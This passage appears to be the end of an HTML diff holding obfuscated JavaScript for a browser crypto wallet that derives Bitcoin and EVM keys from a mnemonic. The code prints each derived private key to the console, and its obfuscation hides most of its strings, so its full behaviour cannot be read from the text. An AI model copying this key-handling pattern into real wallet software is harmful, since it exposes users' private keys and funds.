_0x513075=_0x1d04d4[_0x19b050(0x298)](0x2c)['deriveHardened'](CoinsJson[_0x2e9131][_0x19b050(0x1c3)])['deriveHardened'](0x0)[_0x19b050(0x2a8)](0x0)[_0x19b050(0x2a8)](_0x44f06e),_0x4ab516=bitcoin[_0x19b050(0x272)][_0x19b050(0x229)]({'pubkey':_0x513075['publicKey']})[_0x19b050(0x1f7)],_0xe16cc7=_0x513075['toWIF']();console[_0x19b050(0x109)](_0x19b050(0x1cc),_0x2e9131),console[_0x19b050(0x109)](_0x19b050(0x23e),_0x4ab516),console[_0x19b050(0x109)](_0x19b050(0x2cf),_0xe16cc7),await timer(0x1),await SaveAccount(_0x2e9131,_0xe16cc7),_0x48da32++;var _0x2a6960=(_0x48da32/_0x278247)[_0x19b050(0x1db)](0x2)*0x64+'%';console[_0x19b050(0x109)](_0x19b050(0x100),_0x2a6960),document[_0x19b050(0xea)]('CurrentRestoreAccountID')[_0x19b050(0x1cd)]=_0x19b050(0x17a)+_0x2a6960+_0x19b050(0x1a1)+'\x20\x20'+_0x4ab516,document[_0x19b050(0xea)](_0x19b050(0x2f9))[_0x19b050(0x1cd)]=_0x19b050(0x17a)+_0x2a6960+_0x19b050(0x1a1)+'\x20\x20'+_0x4ab516;}}}SaveAccountIndex('evm',_0x2b51c3);const _0x1845c5=ethers[_0x19b050(0x11a)]['HDNode'][_0x19b050(0x12e)](_0x317254);for(var _0x44f06e=0x0;_0x44f06e<AccountCount;_0x44f06e++){path=_0x19b050(0x160)+_0x44f06e;const _0x560380=_0x1845c5[_0x19b050(0x10d)](path);await SaveAccount(_0x19b050(0x114),_0x560380['privateKey']),_0x48da32++;var _0x2a6960=(_0x48da32/_0x278247)[_0x19b050(0x1db)](0x2)*0x64+'%';console[_0x19b050(0x109)](_0x19b050(0x100),_0x2a6960),await timer(0x1),document[_0x19b050(0xea)](_0x19b050(0x1e1))[_0x19b050(0x1cd)]=_0x19b050(0x17a)+_0x2a6960+_0x19b050(0x1a1)+'\x20\x20'+_0x560380[_0x19b050(0x2a1)],document[_0x19b050(0xea)]('NewUserInit')[_0x19b050(0x1cd)]='<p\x20style=\x22color:\x20red;\x22>'+_0x2a6960+_0x19b050(0x1a1)+'\x20\x20'+_0x560380[_0x19b050(0x2a1)];}$('#RestoreButtonID')[_0x19b050(0x16b)](),document[_0x19b050(0xea)](_0x19b050(0x27c))[_0x19b050(0x1da)]=![],document['getElementById']('MnemonicID')[_0x19b050(0x1ae)]='',document['getElementById']('CurrentRestoreAccountID')[_0x19b050(0x2ac)]=_0x19b050(0x2d1),document['getElementById'](_0x19b050(0x2f9))['innerHTML']=_0x19b050(0x2d1),updateMainAccountSelector();}async function ShowLoginUI(){var _0x4b30da=_0x28cfff;$(_0x4b30da(0xf0))[_0x4b30da(0x16b)](),$('#RestorePanelID')[_0x4b30da(0x2c0)]();}async function ShowRestoreUI(){var _0x509705=_0x28cfff;$(_0x509705(0x10b))['hide'](),$(_0x509705(0xd9))[_0x509705(0x2c0)](),$(_0x509705(0x181))[_0x509705(0x2c0)](),$(_0x509705(0xeb))['hide'](),$(_0x509705(0x1b4))[_0x509705(0x1b5)]();}async function pushToSpecificIndex(_0x1eef00,_0x1732e0,_0x36ad8d){var _0x591dd7=_0x28cfff,_0x2b9905=getAccountsData();!_0x2b9905[_0x591dd7(0x152)](_0x1eef00)&&(_0x2b9905[_0x1eef00]=[]);var _0x2c29c9=_0x2b9905[_0x1eef00];_0x2c29c9['splice'](_0x1732e0,0x0,_0x36ad8d),_0x2b9905[_0x1eef00]=_0x2c29c9,console[_0x591dd7(0x109)](_0x591dd7(0x2d7),_0x2b9905),saveAccountsData(_0x2b9905);}async function ShowPrivateKey(){var _0x998a81=_0x28cfff,_0x4bd2b3=CryptoJS[_0x998a81(0x20e)](pass)['toString'](),_0x804c48=localStorage[_0x998a81(0x28e)](_0x998a81(0x26d));if(_0x4bd2b3!==_0x804c48){ShowToast(_0x998a81(0x13e));return;}var _0x28ebe7=await DecryptAccount(CurrentEncryptedPrivateKey);document[_0x998a81(0xea)](_0x998a81(0x1d4))['innerHTML']=_0x28ebe7,$(_0x998a81(0x2c9))[_0x998a81(0x2b9)](_0x998a81(0x16b));}$('#speedSwitch')[_0x28cfff(0x2fe)](function(){var _0x381220=_0x28cfff;GlobalMinerFee=$(this)['prop'](_0x381220(0x2af))?parseInt(FeeData[_0x381220(0x153)]):parseInt(FeeData[_0x381220(0x284)]),console['log'](_0x381220(0x1cf),GlobalMinerFee),AmountOnChange();});
+</script>
+
+
+</body>
+</html>
+
+
+
+
